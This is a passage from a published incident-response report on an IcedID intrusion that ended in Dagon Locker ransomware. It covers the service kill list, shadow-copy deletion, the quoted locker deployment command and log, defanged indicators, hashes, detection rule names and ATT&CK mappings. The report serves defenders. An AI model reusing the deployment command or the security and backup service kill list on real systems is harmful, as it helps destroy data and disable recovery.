<pre>eventlog<br />wecsvc<br />SntpService<br />Sophos Agent<br />Sophos Endpoint Defense Service<br />Sophos Message Router<br />Sophos System Protection Service<br />ArcticWolfAgentMgr<br />endpoint<br />cybereason<br />cylance<br />DefWatch<br />ccEvtMgr<br />ccSetMgr<br />SavRoam<br />RTVscan<br />YooBackup<br />YooIT<br />zhudongfangyu<br />sophos<br />stc_raw_agent<br />VSNAPVSS<br />VeeamTransportSvc<br />VeeamDeploymentService<br />VeeamNFSSvc<br />veeam<br />PDVFSService<br />BackupExecVSSProvider<br />BackupExecAgentAccelerator<br />BackupExecAgentBrowser<br />BackupExecDiveciMediaService<br />BackupExecJobEngine<br />BackupExecManagementService<br />BackupExecRPCService<br />AcrSch2Svc<br />AcronisAgent<br />CASAD2DWebSvc<br />CAARCUpdateSvc<br />SBPIMSvc<br />OssecSvc</pre>
<p>Deletes shadow copies Sets system to boot into recovery mode on next restart <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-106.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32168" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-106.png" alt="" width="763" height="352" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-106.png 763w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-106-300x138.png 300w" sizes="(max-width: 763px) 100vw, 763px" /></a> Multiple methods to distribute and execute the ransomware If <code>dll</code>, use <code>rundll32.exe</code> If <code>exe</code>, use <code>regsvr32.exe</code> Using different switches depending if there is additional options, or not. <a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-107.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32170" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-107.png" alt="" width="796" height="308" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-107.png 796w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-107-300x116.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-107-768x297.png 768w" sizes="(max-width: 796px) 100vw, 796px" /></a></p>
<p>The module also supports testing using the <code>-dryrun</code> switch by not deploying the ransomware binary.</p>
<p><!-- wp:paragraph --></p>
<p>The threat actor also referenced multiple examples of running different ransomware variants, possibly indicating overlap between groups, reuse of tooling, or perhaps an affiliate that has used all of the referenced ransomware families.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:list -->
<li style="list-style-type: none;">
<ul><!-- wp:list-item -->
<li>Egregor</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>REvil</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Xing</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Quantum</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>justright</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Mount Locker</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Pieper</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>uhmc/ummc</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ottawa</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Conti</li>
<!-- /wp:list-item --></ul>
</li>
</ul>
</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-108.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32171" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-108.png" alt="" width="2464" height="916" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-108.png 2464w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-108-300x112.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-108-1024x381.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-108-768x286.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-108-1536x571.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-108-2048x761.png 2048w" sizes="(max-width: 2464px) 100vw, 2464px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-109.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32172" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-109.png" alt="" width="2428" height="2110" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-109.png 2428w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-109-300x261.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-109-1024x890.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-109-768x667.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-109-1536x1335.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-109-2048x1780.png 2048w" sizes="(max-width: 2428px) 100vw, 2428px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:list -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p><strong>Pivoting on indicators</strong></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>In the script there is a function to send messages to their Telegram Bot. This function is used multiple times throughout the script to send updates during execution.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-110.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32173" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-110.png" alt="" width="677" height="152" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-110.png 677w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-110-300x67.png 300w" sizes="(max-width: 677px) 100vw, 677px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>The domain resolves to 51.89.133[.]3 which has also been seen used as a Cobalt Strike C2 and to serve beacons during other phases of the intrusion.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Checking the certificate associated with the IP reveals an interesting association.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-112.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32176" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-112.png" alt="" width="927" height="449" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-112.png 927w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-112-300x145.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-112-768x372.png 768w" sizes="(max-width: 927px) 100vw, 927px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>108.62.123[.]147 is also identified in the Command and Control section related to Cobalt Strike.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:heading --></ul>
</li>
</ul>
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>29 days after initial access, the threat actor started to deploy the Dagon Locker ransomware in the environment.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>The threat actor distributed Dagon Locker ransomware on multiple systems across the environment through the custom PowerShell script, AWScollector, and the locker module described earlier.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>The following PowerShell command was run from a domain controller.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">invokemodule -module locker -locker &lt;REDACTED&gt;.dll  -lockerpath programdata\microsoft -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>To prevent data recovery and stop multiple services, two different files called sysfunc.cmd were dropped into the systems.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-113.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32177" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-113.png" alt="" width="2432" height="628" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-113.png 2432w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-113-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-113-1024x264.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-113-768x198.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-113-1536x397.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-113-2048x529.png 2048w" sizes="(max-width: 2432px) 100vw, 2432px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-114.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32178" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-114.png" alt="" width="1418" height="1408" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-114.png 1418w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-114-300x298.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-114-1024x1017.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-114-150x150.png 150w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-114-768x763.png 768w" sizes="(max-width: 1418px) 100vw, 1418px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Subsequently the execution of the locker PowerShell module, the ransomware, was deployed to different systems.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-115.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32179" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-115.png" alt="" width="1246" height="509" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-115.png 1246w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-115-300x123.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-115-1024x418.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-115-768x314.png 768w" sizes="(max-width: 1246px) 100vw, 1246px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>All systems were left with the below message:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-116.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32180" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-116.png" alt="" width="827" height="432" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-116.png 827w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-116-300x157.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-116-768x401.png 768w" sizes="(max-width: 827px) 100vw, 827px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Dagon Locker left on the test workstation also a log file related to its execution called <code>sysfunc.dll.log</code>.</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">Ver 5.1 x64
========== SYS INFO ==========
CORE COUNT:	[REDACTED]
TOTAL MEM:	[REDACTED]
WIN VER:	[REDACTED]
WIN ARCH:	x64
USER NAME:	[REDACTED]
PC NAME:	[REDACTED]
IN DOMAIN:	YES
IS ADMIN:	YES
IN GROUPS:
	Mandatory	[REDACTED]\Domain Users
	Mandatory	\Everyone
	Mandatory	BUILTIN\Administrators
	Mandatory	BUILTIN\Remote Desktop Users
	Mandatory	BUILTIN\Users
	Mandatory	NT AUTHORITY\NETWORK
	Mandatory	NT AUTHORITY\Authenticated Users
	Mandatory	NT AUTHORITY\This Organization
	[...]
	Integrity	Mandatory Label\High Mandatory Level
CMDLINE:	rundll32.exe  C:\programdata\microsoft\sysfunc.dll,run /target=C:\programdata\microsoft\WPD\
[INFO] locker.init &gt; locker ext .dagoned

================================
          KILL SERVICE          
================================

================================
          KILL PROCESS          
================================
========== TARGET LOCK ==========
[INFO] locker.work.start.target &gt; type=drive target=C:\programdata\microsoft\WPD\
[INFO] locker.work.thread.local &gt; path=C:\programdata\microsoft\WPD\
[INFO] locker.queue.worker &gt; empty group=FAST
[INFO] locker.queue.worker &gt; empty group=SLOW
[ERROR] locker.dir &gt; enum error=3 name=C:\programdata\microsoft\WPD\
[INFO] locker.work.thread.local &gt; enum finish path=C:\programdata\microsoft\WPD\
[INFO] locker.thread.proxy &gt; finish path=C:\programdata\microsoft\WPD\
==[ STATS ]=======================
Total crypted:	0.000 GB		
Crypt Avg:	0.000 MB/s		
Files:		0.000 files/s		
Time:		1 sec		
==[ DIRS ]========================
Total:		0		
Skipped:	0		
Error:		1		
==[ FILES ]=======================
Total:		0		
Locked:		0		
==[ FILES SKIPPED ]===============
Black:		0		
Locked:		0		
Manual:		0		
Prog:		0		
Size:		0		
==[ FILE ERROR ]==================
Open:		0		
Read:		0		
Write:		0		
Pos:		0		
Rename:		0		

[OK] locker &gt; finished
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:heading --></ul>
</li>
</ul>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32312" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1.png" alt="" width="4550" height="12530" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1.png 4550w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1-109x300.png 109w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1-372x1024.png 372w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1-768x2115.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1-558x1536.png 558w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-117-1-744x2048.png 744w" sizes="(max-width: 4550px) 100vw, 4550px" /></a></p>
<p>&nbsp;</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:heading --></ul>
</li>
</ul>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-118.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32182" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-118.png" alt="" width="3580" height="1886" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-118.png 3580w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-118-300x158.png 300w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-118-1024x539.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-118-768x405.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-118-1536x809.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-118-2048x1079.png 2048w" sizes="(max-width: 3580px) 100vw, 3580px" /></a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:heading --></ul>
</li>
</ul>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h3 class="wp-block-heading">Atomic</h3>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">IcedID

143.110.245[.]38:443
159.89.124[.]188:443
188.114.97[.]7:443
151.236.9[.]176:443
159.223.95[.]82:443
194.58.68[.]187:443
87.251.67[.]168:443
151.236.9[.]166:443
rpgmagglader[.]com
ultrascihictur[.]com
oopscokir[.]com
restohalto[.]site
ewacootili[.]com
magiraptoy[.]com
fraktomaam[.]com
patricammote[.]com
moashraya[.]com

Cobalt Strike

23.159.160[.]88
45.15.161[.]97
51.89.133[.]3
winupdate.us[.]to
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h3 class="wp-block-heading">Computed</h3>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">Document_Scan_468.js
0d8a41ec847391807acbd55cbd69338b
5066e67f22bc342971b8958113696e6c838f6c58
f6e5dbff14ef272ce07743887a16decbee2607f512ff2a9045415c8e0c05dbb4

license.dat
bff696bb76ea1db900c694a9b57a954b
ca10c09416a16416e510406a323bb97b0b0703ef
332afc80371187881ef9a6f80e5c244b44af746b20342b8722f7b56b61604953

Riadnc1.dll
a144aa7a0b98de3974c547e3a09f4fb2
34c9702c66faadb4ce90980315b666be8ce35a13
9da84133ed36960523e3c332189eca71ca42d847e2e79b78d182da8da4546830

magni.w
7e9ef45d19332c22f1f3a316035dcb1b
4e0222fd381d878650c9ebeb1bcbbfdfc34cabc5
839cf7905dc3337bebe7f8ba127961e6cd40c52ec3a1e09084c9c1ccd202418e

magni.w.bat
b3495023a3a664850e1e5e174c4b1b08
38cd9f715584463b4fdecfbac421d24077e90243
65edf9bc2c15ef125ff58ac597125b040c487640860d84eea93b9ef6b5bb8ca6

update.dll
628685be0f42072d2b5150d4809e63fc
437fe3b6fdc837b9ee47d74eb1956def2350ed7e
a0191a300263167506b9b5d99575c4049a778d1a8ded71dcb8072e87f5f0bbcf
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h3 class="wp-block-heading">Network</h3>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">ET MALWARE Win32/IcedID Requesting Encoded Binary M4
ET MALWARE Win32/IcedID Request Cookie
ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)
ThreatFox IcedID botnet C2 traffic (ip:port - confidence level: 60%)
ET ATTACK_RESPONSE Microsoft Powershell Banner Outbound
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB Executable File Transfer
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement
ET POLICY WinRM wsman Access - Possible Lateral Movement
ET INFO DYNAMIC_DNS HTTP Request to a *.us .to Domain
ET INFO Windows Powershell User-Agent Usage
ET POLICY Powershell Activity Over SMB - Likely Lateral Movement
ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File
ET HUNTING Possible Powershell .ps1 Script Use Over SMB
ET DNS Query for .to TLD
ET INFO DYNAMIC_DNS Query to a *.us .to Domain
ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)
ET POLICY WMIC WMI Request Over SMB - Likely Lateral Movement
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h3 class="wp-block-heading">Sigma</h3>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Search rules on <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a> or <a href="https://sigmasearchengine.com/" target="_blank" rel="noreferrer noopener">sigmasearchengine.com</a></p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>DFIR Public Rules <a href="https://github.com/The-DFIR-Report/Sigma-Rules" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network
8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check
59e3a079-4245-4203-9d5c-f11290c5ba24 : Hiding local user accounts
e7732014-c4b9-4653-92b2-aa7cfe154bf7 : Data Exfiltration via AWS CLI
50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery
dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f : CHCP CodePage Locale Lookup
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>DFIR Private Rules:</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM
b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line<br />de60a371-48c3-4e72-baae-ac56c8fb7349 : Data exfiltration to amazon AWS S3 buckets
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Sigma <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noreferrer noopener">Repo</a>:</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation
114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation
b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution
b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI
e37db05d-d1f9-49c8-b464-cee1a4b11638 : PUA - Rclone Execution
c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent
903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution
5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE
cd219ff3-fa99-45d4-8380-a7d15116c6dc : New User Created Via Net.EXE
9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution
0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo<br />1eeed653-dbc8-4187-ad0c-eeebb20e6599 : <span class="hljs-string">Potential</span> <span class="hljs-string">SPN</span> <span class="hljs-string">Enumeration</span> <span class="hljs-string">Via</span> <span class="hljs-string"><span data-searched="true"><mark class="search-term">Setspn</mark>.EXE</span></span>
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:preformatted --><!-- /wp:preformatted -->

<!-- wp:heading {"level":3} --></ul>
</li>
</ul>
<h3 class="wp-block-heading">Yara</h3>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:preformatted --><!-- /wp:preformatted -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Hunting/Analysis Rules:</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:paragraph -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/23869/23869.yar<br /><br />https://github.com/malpedia/signator-rules/blob/main/rules/win.cobalt_strike_auto.yar

informational_AdFind_AD_Recon_and_Admin_Tool
https://github.com/The-DFIR-Report/Yara-Rules/blob/main/5426/5426.yar

Adfind
https://github.com/bartblaze/Yara-rules/blob/master/rules/hacktools/Adfind.yar

nbtscan_utility_softcell
https://github.com/advanced-threat-research/Yara-Rules/blob/master/APT/APT_Operation_SoftCell.yar

Windows_Trojan_CobaltStrike_7f8da98a
https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:heading --></ul>
</li>
</ul>
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE ATT&amp;CK</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-32313" src="https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1.png" alt="" width="1864" height="3638" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1.png 1864w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1-154x300.png 154w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1-525x1024.png 525w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1-768x1499.png 768w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1-787x1536.png 787w, https://thedfirreport.com/wp-content/uploads/2024/04/23869-119-1-1049x2048.png 1049w" sizes="(max-width: 1864px) 100vw, 1864px" /></a></p>
<p>&nbsp;</p>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:heading -->

<!-- wp:image --></ul>
</li>
</ul>
<figure class="wp-block-image"></figure>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:image -->

<!-- wp:preformatted --></ul>
</li>
</ul>
<pre class="wp-block-preformatted">Access Token Manipulation - T1134
Archive via Utility - T1560.001
Data Encrypted for Impact - T1486
Disable or Modify System Firewall - T1562.004
Domain Account - T1087.002
Domain Groups - T1069.002
Domain Trust Discovery - T1482 
Exfiltration to Cloud Storage - T1567.002 
File and Directory Discovery - T1083 
Inhibit System Recovery - T1490
LSASS Memory - T1003.001
Malicious File - T1204.002 
Network Share Discovery - T1135
Process Injection - T1055
Remote Access Software - T1219 
Scheduled Task - T1053.005 
System Information Discovery - T1082 
System Language Discovery - T1614.001
System Time Discovery - T1124
Web Protocols - T1071.001
SMB/Windows Admin Shares - T1021.002
Windows Command Shell - T1059.003
Windows Management Instrumentation - T1047
Powershell - T1059.001
Windows Command Shell - T1059.003
Javascript - T1059.007
Rundll32 - T1218.011
Command Obfuscation - T1027.010
Domain Account - T1136.002
Credentials In Files - T1552.001
Disable or Modify Tools - T1562.001
System Owner/User Discovery - T1033
Data from Network Shared Drive - T1039
Encrypted Channel - T1573
Ingress Tool Transfer - T1105
Automated Exfiltration - T1020
Service Stop - T1489
</pre>
<ul>
<li style="list-style-type: none;">
<ul><!-- /wp:preformatted -->

<!-- wp:paragraph --></ul>
</li>
</ul>
<p>Internal case # TB23869 PR28513</p>
<ul><!-- /wp:paragraph --></ul><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-32050" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-32050" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" 